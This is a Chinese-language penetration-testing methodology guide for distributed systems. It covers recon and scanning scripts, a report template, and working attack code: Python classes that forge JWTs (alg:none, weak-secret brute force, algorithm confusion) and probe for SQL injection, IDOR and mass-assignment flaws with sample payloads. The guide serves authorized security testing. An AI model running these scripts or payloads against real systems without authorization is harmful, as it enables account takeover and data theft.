# 渗透测试 - 安全测试方法

## 概述

渗透测试（Penetration Testing）是模拟真实攻击者行为，评估系统安全性的方法。通过系统化的测试流程，发现分布式系统中的安全漏洞，验证防御措施的有效性，为安全加固提供依据。

## 渗透测试方法论


### PTES标准流程

```mermaid
graph TB
    subgraph 前期交互
    P1[确定范围] --> P2[确定目标]
    P2 --> P3[确定规则]
    end
    
    subgraph 情报收集
    I1[被动信息收集] --> I2[主动扫描]
    I2 --> I3[服务枚举]
    end
    
    subgraph 威胁建模
    T1[资产识别] --> T2[威胁分析]
    T2 --> T3[攻击向量]
    end
    
    subgraph 漏洞分析
    V1[自动化扫描] --> V2[手动验证]
    V2 --> V3[漏洞确认]
    end
    
    subgraph 渗透利用
    E1[漏洞利用] --> E2[权限提升]
    E2 --> E3[横向移动]
    end
    
    subgraph 后渗透
    Po1[数据收集] --> Po2[持久化]
    Po2 --> Po3[清理痕迹]
    end
    
    subgraph 报告
    R1[漏洞汇总] --> R2[修复建议]
    R2 --> R3[风险评级]
    end
```



## 信息收集

### 自动化侦察工具链

```bash
#!/bin/bash
# 分布式系统渗透测试 - 信息收集脚本

TARGET_DOMAIN="example.com"
OUTPUT_DIR="recon_$(date +%Y%m%d)"
mkdir -p $OUTPUT_DIR

echo "=== 开始信息收集 ==="

# 1. 子域名枚举
echo "[*] 子域名枚举..."
subfinder -d $TARGET_DOMAIN -o $OUTPUT_DIR/subdomains.txt
amass enum -passive -d $TARGET_DOMAIN -o $OUTPUT_DIR/amass_subs.txt
assetfinder --subs-only $TARGET_DOMAIN >> $OUTPUT_DIR/subdomains.txt

# 去重并解析
sort -u $OUTPUT_DIR/subdomains.txt -o $OUTPUT_DIR/subdomains.txt

# 2. 存活检测
echo "[*] 存活检测..."
cat $OUTPUT_DIR/subdomains.txt | httprobe -c 50 > $OUTPUT_DIR/alive.txt

# 3. 端口扫描
echo "[*] 端口扫描..."
nmap -iL $OUTPUT_DIR/alive.txt \
    -p- --open \
    -sV -sC \
    -oA $OUTPUT_DIR/nmap_full

# 4. 服务识别
echo "[*] 服务指纹识别..."
whatweb -i $OUTPUT_DIR/alive.txt --log-json=$OUTPUT_DIR/whatweb.json

# 5. API端点发现
echo "[*] API端点发现..."
gospider -S $OUTPUT_DIR/alive.txt -o $OUTPUT_DIR/gospider
waybackurls $TARGET_DOMAIN > $OUTPUT_DIR/wayback.txt

# 6. 技术栈识别
echo "[*] 技术栈分析..."
wappalyzer $OUTPUT_DIR/alive.txt -o $OUTPUT_DIR/tech.json

echo "=== 信息收集完成 ==="
echo "结果保存在: $OUTPUT_DIR/"
```

### 云环境侦察

```python
# 云服务侦察工具
import boto3
import requests
import json

class CloudRecon:
    def __init__(self, target):
        self.target = target
        self.findings = []
    
    def check_s3_buckets(self):
        """检测S3存储桶暴露"""
        common_names = [
            f"{self.target}",
            f"{self.target}-backup",
            f"{self.target}-dev",
            f"{self.target}-prod",
            "logs", "assets", "data", "uploads"
        ]
        
        for name in common_names:
            for region in ['us-east-1', 'eu-west-1', 'ap-southeast-1']:
                bucket_url = f"https://{name}.s3.{region}.amazonaws.com"
                try:
                    resp = requests.get(bucket_url, timeout=5)
                    if resp.status_code == 200:
                        self.findings.append({
                            'type': 'exposed_s3_bucket',
                            'severity': 'high',
                            'url': bucket_url,
                            'evidence': 'Bucket listing enabled'
                        })
                except:
                    pass
    
    def check_cloud_endpoints(self):
        """检测云服务端点"""
        endpoints = [
            f"https://{self.target}.blob.core.windows.net",
            f"https://storage.googleapis.com/{self.target}",
            f"https://{self.target}.dfs.core.windows.net",
        ]
        
        for endpoint in endpoints:
            try:
                resp = requests.get(endpoint, timeout=5)
                if 'NoSuchBucket' not in resp.text and resp.status_code != 404:
                    self.findings.append({
                        'type': 'cloud_storage_exposure',
                        'severity': 'medium',
                        'url': endpoint
                    })
            except:
                pass
    
    def check_container_registry(self):
        """检测容器镜像暴露"""
        registries = [
            f"https://hub.docker.com/v2/repositories/{self.target}",
            f"https://gcr.io/v2/{self.target}/tags/list",
        ]
        # 实现检测逻辑...

# Kubernetes集群侦察
def k8s_recon(api_server_url):
    """检测K8s API Server暴露"""
    endpoints = [
        "/api", "/api/v1", "/apis", 
        "/version", "/healthz", "/metrics"
    ]
    
    results = {}
    for endpoint in endpoints:
        try:
            resp = requests.get(f"{api_server_url}{endpoint}", 
                              verify=False, timeout=5)
            results[endpoint] = {
                'status': resp.status_code,
                'accessible': resp.status_code == 200
            }
        except Exception as e:
            results[endpoint] = {'error': str(e)}
    
    return results
```

## 漏洞扫描

### 自动化漏洞扫描

```yaml
# Nuclei扫描配置
# nuclei-config.yaml
concurrency: 10
rate-limit: 150
bulk-size: 25
headless-bulk-size: 10
headless-concurrency: 10

templates:
  - tags: cve,critical,high
  - tags: exposure,config
  - tags: misconfiguration,default-login
  - tags: kubernetes,k8s
  - tags: api,swagger,openapi

severity:
  - critical
  - high
  - medium

output:
  format: json
  file: nuclei_results.json

http:
  max-redirects: 10
  no-redirects: false
  timeout: 10

reporting:
  include-rr: true
  nuclei-version: true
```

```bash
#!/bin/bash
# 分布式系统漏洞扫描脚本

TARGETS="targets.txt"
OUTPUT="vuln_scan_$(date +%Y%m%d)"
mkdir -p $OUTPUT

# 1. Nuclei全量扫描
echo "[*] 运行Nuclei扫描..."
nuclei -l $TARGETS \
    -c 50 \
    -severity critical,high,medium \
    -o $OUTPUT/nuclei.txt \
    -json-export $OUTPUT/nuclei.json

# 2. API安全扫描
echo "[*] API安全扫描..."
# 使用Postman集合或OpenAPI规范
newman run api_security_collection.json \
    --environment prod_env.json \
    --reporters cli,json \
    --reporter-json-export $OUTPUT/newman.json

# 3. K8s配置扫描
echo "[*] Kubernetes配置扫描..."
kube-bench run --targets node
kube-hunter --remote $(cat $TARGETS | head -1)

# 4. 容器镜像扫描
echo "[*] 容器镜像扫描..."
trivy image --severity HIGH,CRITICAL \
    --format json \
    --output $OUTPUT/trivy.json \
    target-image:latest

# 5. 基础设施即代码扫描
echo "[*] IaC配置扫描..."
checkov -d ./terraform --output json > $OUTPUT/checkov.json
terraform-compliance -f terraform -p ./terraform

echo "=== 漏洞扫描完成 ==="
```

## 渗透利用

### 常见漏洞利用

```python
# JWT漏洞测试工具
import jwt
import base64
import json

class JWTTester:
    def __init__(self, token):
        self.token = token
        self.header, self.payload, self.signature = token.split('.')
    
    def test_none_algorithm(self):
        """测试alg:none漏洞"""
        try:
            header = json.loads(base64.urlsafe_b64decode(self.header + '=='))
            header['alg'] = 'none'
            
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            
            forged_token = f"{new_header}.{self.payload}."
            
            # 尝试验证
            decoded = jwt.decode(forged_token, options={"verify_signature": False})
            return {
                'vulnerable': True,
                'forged_token': forged_token,
                'decoded': decoded
            }
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}
    
    def test_weak_secret(self, wordlist):
        """测试弱密钥"""
        for secret in wordlist:
            try:
                decoded = jwt.decode(self.token, secret, algorithms=['HS256'])
                return {
                    'vulnerable': True,
                    'secret': secret,
                    'decoded': decoded
                }
            except:
                continue
        return {'vulnerable': False}
    
    def test_algorithm_confusion(self, public_key):
        """测试算法混淆攻击"""
        try:
            header = json.loads(base64.urlsafe_b64decode(self.header + '=='))
            if header['alg'] == 'RS256':
                # 尝试使用公钥作为HMAC密钥
                header['alg'] = 'HS256'
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                
                forged = jwt.encode(
                    json.loads(base64.urlsafe_b64decode(self.payload + '==')),
                    public_key,
                    algorithm='HS256',
                    headers={'kid': header.get('kid')}
                )
                
                return {
                    'vulnerable': True,
                    'forged_token': forged
                }
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}
        
        return {'vulnerable': False}
```

### API安全测试

```python
# API渗透测试脚本
import requests
import json

class APITester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.session = requests.Session()
        if auth_token:
            self.session.headers['Authorization'] = f'Bearer {auth_token}'
    
    def test_idor(self, endpoint, param_name, test_ids):
        """测试IDOR漏洞"""
        results = []
        for test_id in test_ids:
            url = f"{self.base_url}{endpoint}?{param_name}={test_id}"
            resp = self.session.get(url)
            
            if resp.status_code == 200 and 'sensitive_data' in resp.text:
                results.append({
                    'endpoint': endpoint,
                    'param': param_name,
                    'value': test_id,
                    'vulnerable': True,
                    'evidence': resp.text[:500]
                })
        return results
    
    def test_mass_assignment(self, endpoint, valid_data):
        """测试批量赋值漏洞"""
        # 添加不应被设置的字段
        malicious_data = valid_data.copy()
        malicious_data.update({
            'role': 'admin',
            'is_admin': True,
            'balance': 999999
        })
        
        resp = self.session.post(f"{self.base_url}{endpoint}", json=malicious_data)
        return {
            'endpoint': endpoint,
            'status': resp.status_code,
            'potentially_vulnerable': resp.status_code in [200, 201]
        }
    
    def test_rate_limiting(self, endpoint, requests_count=150):
        """测试速率限制"""
        import time
        
        start_time = time.time()
        success_count = 0
        
        for i in range(requests_count):
            resp = self.session.get(f"{self.base_url}{endpoint}")
            if resp.status_code == 200:
                success_count += 1
        
        duration = time.time() - start_time
        
        return {
            'endpoint': endpoint,
            'requests_sent': requests_count,
            'successful': success_count,
            'rate_limited': success_count < requests_count * 0.8,
            'duration': duration
        }
    
    def test_sql_injection(self, endpoint, param):
        """测试SQL注入"""
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT null,null--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        results = []
        for payload in payloads:
            url = f"{self.base_url}{endpoint}?{param}={payload}"
            resp = self.session.get(url)
            
            error_indicators = ['sql', 'mysql', 'oracle', 'syntax', 'error']
            if any(ind in resp.text.lower() for ind in error_indicators):
                results.append({
                    'payload': payload,
                    'vulnerable': True,
                    'evidence': 'Error message indicates SQL injection'
                })
        
        return results
```

## 报告模板

```markdown
# 渗透测试报告

## 1. 执行摘要

| 项目 | 内容 |
|-----|------|
| 测试目标 | example.com及其子域名 |
| 测试时间 | 2026-04-01 至 2026-04-03 |
| 测试范围 | Web应用、API、云基础设施 |
| 高危漏洞 | 3个 |
| 中危漏洞 | 8个 |
| 低危漏洞 | 12个 |

## 2. 风险评级标准

- **严重**: 可直接导致系统完全控制
- **高危**: 可导致敏感数据泄露或权限提升
- **中危**: 可导致部分数据访问或功能滥用
- **低危**: 信息泄露或配置问题

## 3. 发现摘要

### 3.1 严重漏洞

#### V-001: JWT算法混淆漏洞
- **风险等级**: 严重
- **CVSS评分**: 9.8
- **描述**: API使用RS256签名，但未验证算法类型，可伪造令牌
- **复现步骤**:
  1. 获取公钥
  2. 使用HS256和公钥伪造管理员令牌
  3. 访问管理接口
- **修复建议**: 强制验证JWT算法，不接受用户提供的alg头

### 3.2 高危漏洞

#### V-002: Kubernetes API未授权访问
- **风险等级**: 高危
- **描述**: API Server允许匿名访问，可获取所有Pod信息
- **证据**: `curl -k https://k8s-api:6443/api/v1/pods`

## 4. 详细发现

[详细漏洞描述...]

## 5. 修复建议优先级

1. 立即修复: V-001, V-002
2. 短期修复: V-003, V-004, V-005
3. 中期修复: 其他中危漏洞
4. 长期改进: 低危漏洞及安全加固
```

---

*文档版本: v1.0 | 最后更新: 2026-04-03*
